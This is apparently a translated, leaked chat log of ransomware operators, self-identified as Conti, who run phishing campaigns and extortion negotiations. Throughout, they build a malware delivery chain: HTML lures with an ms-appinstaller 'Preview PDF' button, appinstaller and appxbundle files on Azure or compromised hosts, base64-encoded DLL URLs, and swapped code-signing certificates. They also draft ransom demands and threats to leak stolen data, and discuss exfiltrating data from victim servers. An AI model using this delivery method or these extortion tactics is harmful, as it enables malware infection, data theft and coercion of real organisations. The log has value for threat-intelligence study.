left but they left the topic and we are now feeding off of it
Mm-hmm.
I made more money with you in a month than in 10 years
Yeah, right.
I may have exaggerated
That's normal.
In five years for sure.
++
you buy an apartment.
you can go ahead and take out a mortgage.
for 120-140 square meters.
Don't take it for cash, take it through a bank.
Not yet, I can't do that much.
yeah
I'll do it through the bank.
Otherwise the tax office will get my ass
I still need to find it and so on.
Yeah, .
I had 24k in debt, I almost paid it off, but the bit fell off at the wrong time
just not at the right time
Wait a minute.
I've got 80k in my account so far.
When it's back on track it'll be even better
At least another 40k and you can buy a square
I have different numbers on my screen and I'm not that worried.
well, yes
the higher the amount, the greater the loss
Exactly like the gain
Well, you probably already have everything
purely a hobby left
and I'm still driving a 2011 polo)))
probably
I'll get my quads done and then I'll change the car
for a new one, like most people)
Okay, the nlbusa's a dickhead.

Hi, write please, how are we doing today ?

hi
just got online
today i finish (at the weekend i did not have time to do everything, i had to rewrite a lot)
either later tonight or tomorrow morning will be ready to start)
forgot again )
hello
here?
what do you think to answer SDIGC
ocean, I did not even start today because of this
do not want to raise the price above 1.130.000
hi
Yeah, right.
so it doesn't go anywhere.
listen, i replied to your message late on friday, you didn't answer me, one thing to decide
[03.12.2021 23:01:08] <best> sorry it took me so long to reply, I had to step away quickly

I am currently monitoring html and internal components
also pass the bots to the guys to work (but I think I will ask someone else to do this, so it would be faster)

on html let's think:
essentially, I always update 2 parts - html lend (there is a link protection inside the lend) and appx files (these files are what html lend points to)
i put the appx files on azure and sometimes mice delete the server on azure (when analysts complain) and so i have to update the html feed itself

To make it as competent as possible, ideally I would like to update only appx files without touching the html lend
for example, you could make a lend to send a request to a server when you open it, and get an answer with a link to the appx files and add them to the button on the lend
it will be possible to change the host appx files without changing even the html lend itself
[03.12.2021 23:01:45] <best> or work like now when the mikes delete the azur server, i update the html lend and update the appx files and then i send you the html lend and you change it and everything runs
I read it. Yeah.
html is fine with me, i uploaded it.
7
2+2+3=?
so as long as the same works on the second option?
when they deleted, i re-upload everything and send you the link, right?
I don't send you a link, I send you a new html feed.
Yeah. .
I in turn update my new html link that I spammed and it works again.
Do a blog on them.
ok)
+
hello
here?
will you be able to do the crypto shk today?
х64
hi
here?
sdgs question.
come on
+
See
well
there's a fucking negotiator out there.
I'm thinking of sending something like that.
I'll send it to you in 10 minutes)
So, you won't raise your offer anymore?
If it is too hard for you, I will ask in another way: can we already publish ALL your data?

P.S. for the company top management:
Your negotiator looks like a low-class bot. He says the same words and don't do anything to solve the situation. We advise you to fire him, he is useless at all. We both know that you wouldn't restore the data, no one did it yet. We both understand consequences of the data publication. Hope you understand that we offer much more easy solution.

So, our word is next:
LAST PRICE is 2,600,000. We warn ahead - there will be no more discounts.
Any attempt to decrease the price will result in a price increasing.
We are tired of this useless time spending. Think several times now.
Give them the last price
now
Read .
Let's make it $3,000,000.
Let's give it a shot.
But that's the endgame.
Let's do .
Yeah. .
I'm ready.
It's either yes or no.
+++
gone
It's a bouza.
so it's the french, i don't have them on the list you posted yesterday. https://group.chantellelingerie.com is their website, right?
Yeah, that's right.

They're international.
Yeah, I can see that.

this point is just not purely up to me, that's why i'm asking you now, so i'll ask
what was normal with the bots ?

[00:19:42] <fire> hi again)
ahhh
checked it myself all ok
here
it's not hard for me
well it didn't come to me
at least confirm it.
Maybe OTR ate it or something.
Yeah, I guess so.
Why didn't you ask?

I'm fine.
Hi.
I just took it off and went to sleep.)
You're good.))
I'm getting my ass kicked, like always.)
Didn't even know why.
I know what's going on.
[17:12:55] <veron> got it
[17:13:16] <veron> if you have default link opening in acrobat, not infected
[17:13:29] <veron> well, or other application
ahah
sorry)
hmm
and how through acrobat you can open such links?)
even wondered)
hmm
but how can you open such links through acrobat?)
even it's interesting)
[17:14:58] <veron> [17:12:55] <veron> got it
[17:13:16] <veron> if you have set by default link opening in acrobat, it's not infected
[17:13:29] <veron> well, or in another application
[17:17:33] <best> hmm
how can you open such links through acrobat?)
[17:17:36] <best> even it became interesting)
need to figure out how to check to see what the problem might be and how it works)
is it Adobe mail client or what?
acrobat
and send me an example of a letter or a letter of some kind

I'll put on the acrobat, I'll finish your ribbons first.
Hey, did you get in touch with everyone yesterday?
I'm skippy as always.
to redeploy.
I need you to back me up if you need anything.)

I made a spare band for the first backend.
I can turn it around in about 10 minutes if it gets knocked out fast.
I'll make a backup for the email, let's check it out.)
did you tell him something about our project?

Here's the lend, html.
It's simplified. There's only one button.
you can try to put this html directly into the letter, see how it will work and whether they will put it)
I'm thinking how to do it.

write me if it works or not).
bot seemed to go well, and then silence again
need to check the lend
There was an error accessing the file from the Internet. Try to download and open the file locally.
[18:27:00] <veron> bots seemed to go well and then silence again
[18:27:06] <veron> check for band
is the band broken or already jammed?
a minute
yeah, first one got busted
very fast this time
it's time to get off the azur, it's bullshit
they lock too fast
shit (!
can you update the link?
i think there are no bots (
i'll make a quick one for the spare one
yes
come on
do you have to have everything on azura ?
I was just saying that everything should be stored on shells, they take longer to break
If I understood the logic correctly.

https://privatlab.com/s/v/pwWXJlExL7C9EJRgGGEN
good thing I made a spare.)
i had to get around the corp in the first place
i wanted to get the corps to work well. but since your letters are flying too and you're not on azure, i think you should just leave it alone.
i'm thinking about leaving these fucking servers and other nuances, and giving them all to you along with the lends)
i'm thinking about the right thing to do, i think today i'll decide that point too
[18:32:55] <best> 54GFQw#G$H^WFdwDEAW

hi
I like lend in general
want to inbox well clicked, infected
the volume can be done
Let's think about what we need to optimize so we don't have to deal with blocks like this.
but we need to think about a killable lend and quickly recovering ))))
))))
I need to keep everything on the shelves.
draw me a diagram again )
i don't know how to load what from where, i don't really know how to load it yet
either the main files separately on the shelves, and html separately
it takes 1-5-7 days for them to reach the administrator in Thailand
i have a feeling that i clicked your scripts to death ))))
there are a lot of clicks and hits
21,773к


in an hour and a half.
Look, I'll tell you a little problem and you tell me if you can solve it)

there are 3 parts
html, appxinstaller and appxbundle
my loadir and your load is loaded in the appxbundle file, but to run it this nice, you need an appinstaller file
And for the appinstaller to understand which appxbundle you want it to load, inside the appinstaller file you will find the following line
Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle" />
this link is static (i.e. you can't insert a php script to give this file away, it must refer to appxbundle by file extension)

and there is also this link (in the appinstaller file):
Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appinstaller"
Here the appinstaller refers to itself (because it has to be on the web exactly to load)

Well the html file itself, which has such a button inside:
<a href="ms-appinstaller:?source=https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appinstaller" id="btn" target="_self">Preview PDF</a>

As you can see, the appinstaller refers to itself and to the appxbundle file, and the html file refers only to the appinstaller file

So, I wanted to host everything on shells, but there is a small problem: dynamically in html I can get the current url where the html file was opened (for example https://shell.com/index.html)
and if i put an appinstaller file next to it, i can use JS to take the current url, trim it and appinstaller file and link to it
so the first issue is solved

but the appinstaller has to reference the appxbundle file and itself, so you have to change the references in it too
Okay.
Prviet. Horse takes. Reverse while Zeus works out.
Notes put
hi
pongyal
Where's Horse?
I didn't see him on line.
does zeus have a lot of bots?
and here's a question - can you automatically detect the url where the shell is, change e.g. links in index.html (1 link to appinstaller, https://shell.com/file.appinstaller), in appinstaller file (2 links, one to itself https://shell.com/file.appinstaller and one to appxbundle file, https://shell.com/file.appxbundle) and then upload them
?
Yes there is also
Online
of course I can
just need to tweak it
Yeah
where it is))
funny
There's work to be done
♪ the boots are coming ♪
the nets are coming
ah, well, I understand why there are no launches)))
this time they withdrew the intermediate certificate in 3 hours))))
dums didn't have time to work out
how fucking fast of course))
i told you ((
stop )
?
stop)
not to fuck it up.
i texted him.
let's get it right and we'll be pouring normally and quietly)
we'll set up your lanb and my spamming will fuck them up.)
they're gonna be fucked.
we just need to tune it up a little bit.)
really.)
the bots are coming in fast, you can tell.
if i don't wait for him
Ask
if I don't wait for him ask him if he takes all the bots
in the admins
veyron
and what are the results in terms of nets
that take.
ok.
let's see what comes out
out of all this.
It's all over the news.

Yeah. .
about the emote
And flash banding.
♪ tweeting all over the place ♪
))
[19:05:07] <veron> sure I can
[19:05:15] <veron> just tweak it

that's great
Then let me today, instead of fucking with lends and azur damn, just give you a more detailed description of TOR, prepare scripts and show you where and what to change, and you from your side file autocorrect files and filling to shells, and that's all)
Horse what
you will host absolutely everything on shells
did you change your toad?
in the fire of paranoia?
Stop spamming now, I'll read it again in peace.
Yes, I did.
the only nuance you just saw is they can revoke the interim certificate (before you and i had enough for 2 days, now i had enough for my tests yesterday + spill today for a couple of hours)
I'll get some coffee.
((
and then i have to update the appxbundle file itself with the new certificate
but there are no links in it, so I can send you the new one immediately, and you just pour it over the shelves by the same names and that's it, it keeps on pouring :)
well yes, that's what i was talking about in the first place
trampich, VWkYI95vHZxIHk07m6dZiLCHeP0OA7b4Jl5ywtTJ2RGGJwWW95KiGUcrCLG0qZB
want to know the amount
but see, to throw it to you like this, and I need you to fix your system to process these 3 files and then fill in the shell)
I'll write back in 30 minutes.
sorry i was hoping to catch up with us today ))))
then there will be no issues with azur and lend me
I will keep an eye on the servers, clean files and update you periodically appxbundle files to continue pouring)
prepared )
everything will be, i am sure)
we will catch up with more than a thousand pure yusa tightly)
and i need your advice, how much SRY should i put percent approximately?
hahahahaha
he mouthed off to me
how he's not afraid of anyone
offline.
and then the toad changed.
)))))))0
Fucking hilarious.
because they're so fucked up.
but now you can make something spammy give them a dll)
))
would like to know
how he's doing it
killer
or like this
at some %
a lot of comments?
in the admins
what did he take to work
tell me please
I haven't looked in a while.
I'll check it out.
Fuck, i'll try.)
Theoretically it'll work.
you changed the link everywhere to the last land you posted, didn't you?
Yeah. .
i'll try now and i'll tell you in 5 minutes if it works or not)
I need to discuss html, I'll do it
OK)
1. <a href="ms-appinstaller:?source=https://documentreviewmain.z13.web.core.windows.net/lneddhlhna.appinstaller" id="btn" target="_self">Preview PDF</a>
this one change in html ?
further tell me where else ?
ms-appinstaller:?source=https://documentreviewmain.z13.web.core.windows.net/lneddhlhna.appinstaller"

here we point to the local folder, next to it will be your two files
There's not a single comment in the first admin.
I'm looking at the second one.
Check with Hors and Dave.
https://i.imgur.com/aEnyme5.png
if they put comments.
and where.
you got a dll busted, by the way.
))) plz
right now)
thanks
ok
oh, fuckin' stop.)
Horse said today he hasn't tagged
it's on the second backend.
for a minute
I've seen them take a couple of bots to work.
I know they do.
There was an error accessing the file from the internet. Try downloading and opening the file locally.
Yes I see))
just upgraded the file and they kicked my server azur)
Anyway, it will be very cumbersome to update now, to be honest
ok (
see
<daiverjm> talked to him about it yesterday)
yes, i will tag the bots today, no time
yes, let's go back to html
let's go one by one
1. html
Yep
What's there to change?
just this:
1. <a href="ms-appinstaller:?source=https://documentreviewmain.z13.web.core.windows.net/lneddhlhna.appinstaller" id="btn" target="_self">Preview PDF</a>
[19:21:27] <veron> 1. <a href="ms-appinstaller:?source=https://documentreviewmain.z13.web.core.windows.net/lneddhlhna.appinstaller" id="btn" target="_self">Preview PDF</a>
[19:21:37] <veron> this one change in html ?
no problem
This one should essentially be:
<a href="ms-appinstaller:?source=https://shell.com/file.appinstaller" id="btn" target="_self">Preview PDF</a>
woo
I can even do it now without, correspondence.
Horse said today that he hasn't marked it yet.
I've seen them take a couple of bots to work
<daiverjm> talked to him about it yesterday)
Yeah, I'll tag the bots today, I don't have time
file.appinstaller - the name you give to the appinstaller file (you can name it whatever you want, as long as it has the .appinstaller extension at the end)
steamroller will swear at you too...
then what
?
let me send you appinstaller and appxbundle files as examples and show you what to change :)
why don't you send it to me and let's check it out ?
)))
54HG$#f54wBfweacvstrh65s
https://privatlab.com/s/v/8Ra0n4J437ImGnOr99G4
download, open file jajnedhneb.appinstaller
text editor only
))
then ?
the installer opened
look, there are 2 Uri links in it
the first one:
Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appinstaller"
aha
change here
original:
Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appinstaller"
what to change to:
Uri="https://shell.com/file.appinstaller"
no problem
next )
and there is also a second Uri
Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle" />

it has the same situation
original:
Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle" />
What to change to:
Uri="Uri="https://shell.com/file.appxbundle" />
ok
then
That's it, that's all you need to do :)
I'll do it manually now.
I will do a new html, will it work?
If they revoke the certificate or lock the appxbundle file (something inside lock there, which is kinda rare), you will need to fill a new appxbundle file and in appinstaller change one more line:
Publisher="CN=Kolpin LLC, O=Kolpin LLC, S=Moskva, C=RU"

ischolarly:
Publisher="CN=Kolpin LLC, O=Kolpin LLC, S=Moskva, C=RU"
new:
but here I will not tell at a glance, because here the data of the certificate and only at the moment of transferring appxbundle I will tell you what data to write here :)
ok i will put it there let's see, at the moment is the certificate alive?
Nope, it's a dead cert
let me give you the appxbundle file with the new cert and give you the new publisher line, let's check it out :)
let's do it, I'll post the files
come on
new publisher:
Publisher="CN=Neyros LLC, O=Neyros LLC, S=Sankt-Peterburg, C=RU"
6wFTRHg34f%$#ahg$agE
https://privatlab.com/s/v/YOj57MolxAu4BlYM66BM
this one's got the right certificate.
just theoretically, you can check it now, if everything works - you can even update your shell with the installer quickly and installs will go)
doing
I'll be gone for 7 minutes.
i'll eat quickly, i haven't eaten anything :(
the steamroller is swearing at you too...
an explicit indication is needed here?


Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle" />

can I do that?


Uri="ttps://tienda.alfrio.cl/Navajo/EMLpuzI7tf/" />
let's check without explicit.
I didn't check that, explicit or not.
but most likely explicit as well.
https://tienda.alfrio.cl/Navajo/EMLpuzI7tf/
Put it in your html.
Check
<?xml version="1.0" encoding="utf-8"?
<AppInstaller
	Uri="https://tienda.alfrio.cl/Navajo/EMLpuzI7tf/"
	Version="1.7.0.0" xmlns="http://schemas.microsoft.com/appx/appinstaller/2017/2">

		Uri="http://jkla.com.br/wp-content/a5kV/" />
</AppInstaller>
I did it that way
please check
minute
Nope, that didn't work.
can you specify the files explicitly?
sec
yes
paranoid
hi
how are you
The bots are coming.
you're commenting?
it means you have to rewrite
thought you could redirect it )
Hi
It seems to pull the appinstaller file fine, but appxbundle does not
Uri="http://jkla.com.br/wp-content/a5kV/" />
there seems to be a hitch)
Not sure, maybe it's not working :(
sec
the link works
the link yes, but it seems to be waiting for an explicit reference to the appxbundle file
not this kind of return)
you can fix it now ?
i'm all set up to work, i'm afraid of screwing up (
i don't have anything to fix.
it's a system requirement, not because i want to :(
ok
the installer is fine.
The appinstaller file probably pulls it, but the appxbundle does not...
that is, it pulls it up:
Uri="https://tienda.alfrio.cl/Navajo/EMLpuzI7tf/"

but apparently not this one:
Uri="http://jkla.com.br/wp-content/a5kV/" />

[20:28:28] <daiverjm> in general there are a lot of bots there, a couple thousand live approximately

the problem is that I have to get a hold of them, I can't remember which one, I should probably get the domain kicked in as soon as it gets fed
ATLWVD03 - here they are solving the problem with pumping, blocking all outgoing traffic, does not let even the mega download, the case is small by itself
CTXPROD017 is the same 5.7pc khr that is in negotiations

Group Accounts for \\ISCADC07.nbhdhqdomain.nbhd.org. The admin there was very angry.
I started downloading to onedrive and it got busted.

CTXPROD017 is the same 5.7pc khr that is in negotiations

Group Accounts for \\ISCADC07.nbhdhqdomain.nbhd.org. The admin there was very angry.
I started downloading to onedrive and it got busted.
Nothing came out with this case (in the end, what was downloaded, locked.

to host appinstaller + appxbundle + dll files side by side - i managed to do it last night))
you can do it that way
but you need to either host the dll with a static path on the shell (so the installer knows which path to take the dll), or make it something like a parameter https://shell.com/path/?dll and when I tap on it, you give the dll to me)
hey

I'll send it to you in 5 minutes.

Hi.
Yeah. .
Send it to .
You don't have to wait.
They should see the blog right away.
Okay, by the way they have a good date.
in fact the blog should be pulled to them automatically for the chat
so they can see the link right away.
I already made a tree file for them if they ask for it.
and we're just throwing it in the chat like indians ((
Yeah, okay.
Well, as it is.
Indians or not, it works.
it's not supposed to be like that
Well, you run your software, we'll do what you want.

- if we put in the .appinstaller
        Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle?param1=https://some/some/1.dll" />

then bundle will be able to get https://some/some/1.dll and download it?
Yeah, pretty much.
It's a little different but the link looks different.
I'll show you how.
You won't have to change the line in the appinstaller file, but even in the html feed)
ms-appinstaller:?source=https://shell.com/file.appinstaller&activationUri=custom-params:?data=https://host.com/1.dll
ok
This is how you would put it on the button in the feed
&activationUri=custom-params:?data=https://host.com/1.dll
that's what it adds)
fit two ?
try somewhere else.
would that make it easier for you?
yeah
How are the nets?
super)
ok
in work, the report will be collected today)
in the admin panel i left a comment on all that work
the next upload will be in a group to determine them not to overload)

Saw the page. You have 270 GB or just that data? If you have 270 GB, where is it?

yes
coming soon
They're just writing it off.
I would throw the blog at their shoulders.
this is why i'm always not in favor of writing 10 times the amount of data
How'&nbsp;d you take 270 GB? That seems like a lot. Not sure how you could'&nbsp;ve done it.
let's in the future remove that altogether, replacing it with words like a lot, big, etc.
hi
here
?
help
here
I'm listening)
help please
trampich as always
he'll get it up and then go fuck himself.
Come here. How'&nbsp;d you take 270 GB? That seems like a lot. Not sure how you could'&nbsp;ve done it.
LL_main
We only have 27GB.
He fucking wrote 10 times that.
it looks like the company didn't have that much.
That's what the fuck you're talking about?
what do you think?
I have a couple of options on what to write.
1. Either they got it wrong and we're really only 27.
or two.
Here's a part of your data file tree that's on one of our servers.
So there you go.
now it's just a bit difficult to get out, when as i understand they did not have so much data))
Go ahead, it's not a problem.
What do you say?
what to broadcast?
koo
just a company-- have you seen rhubarb?
3.5 billion.
You can't screw this up.
and you already started with this.


and we charged them 25 million
fuck
Trampy said not to discount at all
and then you fucked up the whole thing
so i'm consulting with you.
What do you mean don't discount?
he doesn't answer)
should i tell them to go fuck themselves?
literally.
no
At the very least.
the bare minimum.
Oh, fuck.
Oh, shit.
But that's not the point.
I'm just trying to get out of here.
What do you say to the second option?
I'd give you a list and say part of it.
or offer me your own.
Well, that's what I'm for.
Only then if they ask for another sheet.
I'll be sitting on my ass.
and then I can get out of the way.
Okay.
ok then
[19:55:33] <fire> then it's okay to leave
[19:55:44] <fire> like we've already given enough prouf
[19:57:40] <fire> I just don't understand why fuck up
[19:57:49] <fire> it's one thing when there is no date
[19:57:56] <fire> and not to fuck around
agree
ok
I've already started
there as it goes
gut
no time at all
fuck all sides
by the way, today i told tramp that i have been working with him for 1.5 months, is it not time to raise it to 1%
he said he would talk to Dreshev
and what do you think they decided?
ahah
they didn't fucking decide.
They left it at 05.

They told me to go fuck myself.
♪ said be happy about it, too ♪
fuckin'
♪ and I don't give a fuck that I work for three people ♪
well, you better be ready.
I'm leaving in the spring.
and i get three hours of sleep a night at the most.
I won't be alive till spring, bro.
fuck him with that fucking schedule.

That's why I'm gone till New Year's Eve.
and then I'll be gone in January.
Then I guess that's it.
almost to the end.
You can't make all the money.
And health is one thing.
No money can buy it.
that's true.
and they're Jews
I don't think they'll give me a raise.
I'll leave, go to Manki's
♪ to take my place ♪
It's a fucking great team.
We'll work it out later.
He's riding me.
And he's unhappy that I'm out for a couple of hours in the evening
while I'm picking up the kid from day care.
It's fucked up, yeah.
so i'm not really happy here, like i'm being used as an indian
i'm really starting to fuck up. i'm simultaneously shoveling terabytes of data, i have to do blogs for all companies at once, i post gigabytes of information to websites for those who have not paid, and i also have to manage to answer in all panels)))
for 0.5%.
they must be fucking laughing, they fucking found an indian
Fuck, we've got separate people doing this
but what the fuck do you need separate people for when there's an Indian?
So you do realize that the grid is big.
and you can't get much out of it.
Well, I understand... but not 10 times as much to say)))) well, with skippy consulted, decided to go as they went. there we'll see. because as I understand the company itself fucked up from such a volume and questioned whether they have so much data)
It means the approximate amount of data. I can give you a part of the file tree, if you want of your data to appreciate.
Give it to Skippy.
He'll do it.
They'll forget about the 270.
Okay?
That's what I was talking to him about.
before you wrote it.
They're too big for you.
Give it to Skippy.
You're the boss.
I told him everything.
That it was under his watchful eye.
They need to be gassed up, but no, I can provide you with a part of the file.
What kind of answers are these?
They need to be unloaded.
so i'll stay out of it, let him fuck it up
auf
yeah
Where the fuck is he?)
I'll learn a lesson at the same time.
that's on him.
That's it, I did my part.
now waiting for your side when you roll it out)
ok, i will, tell me how it will work from your side
OK, now I'll do the final testing on my side and describe it to you.)
my message can be hidden by the way, they haven't read it yet
I did!
Write something there please.
I hid my message.
They haven't had a chance to read it yet.
Now
write here please gXLy5m5Y5WPMpKVdSvacdMbEA5T81UcM34pC3WoyBweqeBFkIiCPdE4snQUA5lik, guys are waiting for the amount
by the way, there are multiplication modules, don't know if you know it or not, when loaded you can run these modules on the same day, they are updated every day
they work for both worrgrappe and domain
everything, it works for me)

Anyway, here's the scheme:
In the htmland in the link this:
 <a href="ms-appinstaller:?source=https://datastorefiles.z13.web.core.windows.net/cnmnghdaeo.appinstaller" id="btn" target="_self">Preview PDF</a>

it is now possible to pass special parameters to the .dll you want to load
so you can give different dll on different bands and divide it among your backends too

What the link looks like when you pass the link up to the .dll:
 <a href="ms-appinstaller:?source=https://shell.com/file.appinstaller&activationUri=custom-params:?data=https://host2.com/file.dll" id="btn" target="_self">Preview PDF</a>

And storing the files as we discussed - the html feed in one place, and the appinstaller and appxbundle files in another (as I said before, so that there is an explicit reference to them)
&activationUri=custom-params:?data=

this is the mandatory part, which cannot be changed, because it is a prescribed rule by mice and the installer statically parses it
I will also send you the appxbundle file and the certificate data
no more internal changes)
if you deleted shells from where you download the dll, I do not need to rebuild appxbundle file because the link there is not statically protected and is now passed from the link, where to download and run the dll
great) accepted)
if you want, you can pass the link to the .dll not in its pure form, but you can encrypt it in base64 for example, and I'll decode it and that's it)
but tell me now, because I need to do such things in software right now)
let's do it in base64, it's safer
I'll encrypt it
ok
then i will wait for a link encoded in base64 in the parameter data=
decode it, load the dll and run it like before
will you be able to roll it out today or on Mon?
or at the weekend?
i want to test it before pouring it out to see if it's ok)
I'm thinking Monday.
okay
If you make it, it would be nice to have the cmd commands thingy that I threw in by Friday
I'll try to get the links as soon as possible
because we need to get more uss done before the holidays
yeah
Another newbie.
You'll get your prize when you show up.

hi
rw0J6Ap3LZNfxsJyo6UpClQbrgD1dzRjxZLVZep0QQEFdl01ihbHIkEvZt91EvtA - this explains the amount
because they are lawyers and they pay
500 exactly from them
now they will start crying that they don't have that much
It's just that lawyers know how to understate their income
so they don't have to pay a lot of taxes.
There's a lot of dates.
They're here.

Not almost, but all of them.
Well, the word "almost" at the end of.... doesn't sound good.

they are willing to pay 1k quickly

they need decryptors

The board is willing to go to a maximum of $1KK, which is what I provided to you.  Hopefully, they will understand.  The company revenue is under $100KK.  This is a not a large organization.   Let me know what you can do.  
16:18

But if you have data on their cyber insurance and maybe they have a lot of dereg in the account need a bank payment then I can bargain
16:19

I'll be online by 9 p.m. Moscow time
16:20

Go through the paperwork and see if there is insurance and bank statements
Okay. .
Let me know where you e-mailed them.
Right now it's .
but if you have their cyber insurance information and maybe they have a lot of dereg in their account I can negotiate.
you might want to go through their files.

so i'm sorry but i will always double-check
I told you from the start that for me the money is secondary, for me it's the people and the attitude that are important

by the way, how much do you think you can really get off lemancorp?
maybe the negotiator should just say that you can shit your pants all you want, but we're not gonna go less than 5k and that's it
yeah
That's what I said to k55.
and I wrote the same to pantner in the next panel
That's good
I think this negotiator has already negotiated with us
and understands.
yeah

please identify
I'll do a blog on them
now
I found only medical, dental and life
ok
Why can't you figure it out?
We'll find out soon, my server crashed where the targeting info is.
I would've figured that out a long time ago.
Oh, I'm sorry, I didn't know.
Ok, I'm in the way

Publish at 5-10% of the dates they have
tomorrow night
today is the day off
+
+
Well, they wrote it off.
and what to do?
now
maybe ask them to introduce themselves as a company
where did they sign off?
I don't see it.
vOjdyhnt7ADeB867Pg5e1ANOWX40k3KndyNiyaRB1mwP0KMtHLnPeuVSj99huNzu
into the panel
those that are not identical
ah
Yeah.
It's okay to wait.
Let's find out who they are.
Okay. .
This is Conti a Team.

Introduce yourself to who we are talking to from your company.
Just text them something like this for now.
+
vOjdyhnt7ADeB867Pg5e1ANOWX40k3KndyNiyaRB1mwP0KMtHLnPeuVSj99huNzu - I raised the server, on these guys input info from my partner, how will come to identify them.
at resolvedev?
no
Ok, fine.
We'll wait for him.
+
,
?
hi
no money yet.
I'll throw it in as soon as it drops.
sterna
haven't seen it.
not in a fuckin' week!
i have to load something else, not the tricks...
the second one is gone
10 days)
rrrrr

Listen, what if I drew the wiring...
You decide.
Decide .
can you fit it in?
What's the load?
Who is it?
I don't think they do.

on the dock.
yeah
We'll have to come up with something to sting.
Social engineering...)
What the hell do you think of?
See?
here you have to have a wide audience
and there was a time when a man wrote to me and he knew that it was for FRG
and he gave a lead in German and everyone was hooked
think about what to write or draw so that people would press the button
find a pschiolg)
psychologist

+ it's a good idea to put a password
really
it's not a problem
password
although I think the avers have learned how to bypass it
and that the main thing is to click and enter the password
not likely
What's wrong?
I tried it with a password.
It's confidential. People like that use the office...
They would have already done it.
The avers are going fucking nuts.
I'll be there tomorrow morning.
ok
this SVL company
price is asking)
Trampych, yes, I know I'm busy, but at least name the amount and I'll send it to them.
there
Damn internet failed(
I can't see what you wrote, please repeat it when you do
I'll tell you
Go to
and the panel can be deleted?
there's a negotiator asking
SVL <http://SVL.COM>.COM 19m
he's already in the second
They have rhubarb.
I'll tell you how much we'll bet them.
Yeah, come on.
800
ok
++
I've been dueling and blocking that chat room.
it's the negotiator who came
lf
I texted you)
Yeah. Yeah.
I saw
Look for the financial documents )
you're referring to )
)))
there's no financials at all.
just accounts and stuff.
why do we need financial documents?
we don't need any.
i won't give him anything
Here?
Hi.
Will you text him?
Yeah.
i'll text him
let me see.)
hey
yo
ti kto?
ok
Yes, we gave you the not even standard discount, but probably in vain, because you're starting to repeat the old song again. you will see all the documents after we will publish it, if we do not achieve the result. Our price is $5,500,000. You must explain this to the company. Now it's your problem.
What are you doing there?
Are you even here?
Yeah. .
i'm talking to someone who's been in touch with this negotiator for over a year now by mail)
))
ok
he says it's about the lvy
we got the lavy.
yeah
http://continewsnv5otx5kaoje7krkto2qbu3gtqef22mnr7eaxw3y6ncz3ad.onion/GV8PuAI7_LAVI
Yeah, I know.
He says there were some offers from the negotiator.
They don't answer.
Like, the guy's coming over. Ask him.
Wow, I had no idea.)
We'll find out.
when he comes.
Well, I don't know either.
There's some fucked up shit going on.
it's all supposed to be in the dashboard.
And it should be clear.
not behind some fucking backstage.
Yeah, right.
I just really don't like it when there's no transparency.
so I think the rest is fucked up.
i don't like it either
yeah i'll talk to reshayev
make your software faster bro
so what's the negotiator's answer?
Is my answer okay?
I'll tell him right now.
Yeah. .
Send it to
+
Fuck, there's a new one.
n7fsW0zDZVIj0wxxe7G7qpFDcxJI1TQfNJLYXCLPU1G5zQtwXCVTRNGF3xrDvx51
can you tell?
and also, tramp, do we not have any SVL date??? I see the folder is empty at all
yeah
Right now
Yes, we have a date on it.
I'll give you the SVL date tomorrow.
Okay. .
I just need the date.
I already made a blog.
The date is only
so
Write to that fucking negotiator.
I'm writing
ok
I was expecting that answer.
I'll be right there.
Tell him if you put the dialogue there, I'll delete the chat and block you, and we'll publish you as a lover.
You tell them the price, you went to them and told them our terms, we are not interested in your opinion
Tell them we'll just publish their information.
Yeah, that's pretty much what I said.
It's your job to get ahead of the story.
ю
Fucking
shit
It pisses me off.
that motherfucker who's on the phone with him is gone.
now i'd text him too
)))) take it easy, tramp.
it's alright
please identify the ID above
now
bitch
))
you hid ?
my message?
or did i accidentally
it looks like i accidentally)
If you publish 1 file of our data you will get nothing.
he's a pussy.
You accidentally hid it yourself.
Yeah, he's lying.
I didn't hide anything.
That's what I figured.

It just showed up two messages in a row.
Fucking
tell him you already offered 1k in the mail.
Why the fuck are you running this circus?
cause they're fucking around.
I was hard on him.
It's okay.
Or did you have to settle for 500k?
Fuck him.)
i'm sure he'll go now.
I don't even need any money from that motherfucker!
Fuck him!
these motherfuckers piss me off.
you know he fucking won't even talk to the company
Now the company's going to suffer
I made him do it
we'll see tomorrow, i'm not gonna post anything yet
i shouldn't have blocked that chat room
We're gonna charge them at least $1 million
bitch

Yeah. .
That's where you rushed it.
You should have kept it from them.
Yeah.
We need to find out how to get them out of the ban
You see that creep doesn't want to tell the company either
No way.
I asked
Just the new one.
Write to him tomorrow we will call the director of the company and we will call him for a conversation in a separate chat room
and continue the dialogue with him
Yeah. .
We don't like you, goddamn it!
that's more or less what i wanted to do
)))))))
but i enjoyed fucking that motherfucker up, i really did.
I love it.)
I'm looking at his correspondence, it's all right. I think I pissed him off.
I'm so fucked up that I'm gonna report him.)
Yeah yeah.
You should just piss him off.
You write and tell him that we'll call the company's management every day and tell them that you are a person who does not want to negotiate with us, if they do not want problems with claims from their own employees, they'll just forget about it.
Yeah, I'll write. As long as he's gone.
I pissed him off.
I'll go report it)
.
And he's a complete and utter wanker.
Yeah. Yeah.
i'm not gonna drop the market
♪ we've got to push it ♪
We'll crush it.
i'm sure. if it wasn't a negotiator, i'd be soft.
+
and this prick got what he deserved.
Yeah. Yeah.
No luck identifying the rookie?
I haven't signed up yet.
Okay.
All right, I'm done for the day, it's quiet.
I spent the weekend here)
LEMANSCORP
It's the same company.
So it's okay.
it can see and read?
Or hardly
in a bathhouse.
Okay, good luck. less nerves, no money can buy them))


Hi Max. I have nothing new so far. My friend did not help me in any way :(. We have to turn off the power in our house, they say from 11 o'clock, some maintenance work at the substation. So I'll probably be off in the afternoon.

i had a problem with my computer, i was setting up a new laptop and i fucked up my computer so it wouldn't run at all
i ran to get another laptop, i found a backup from september and it started up somehow
I tried as hard as I could to do it all quickly, but as a result, I have not slept here for 3 days, as soon as I set everything up - some weird stuff keeps popping up. The VPN did not start automatically, then I overreacted with the security that no programs were running, and now the whole fiasco came out...
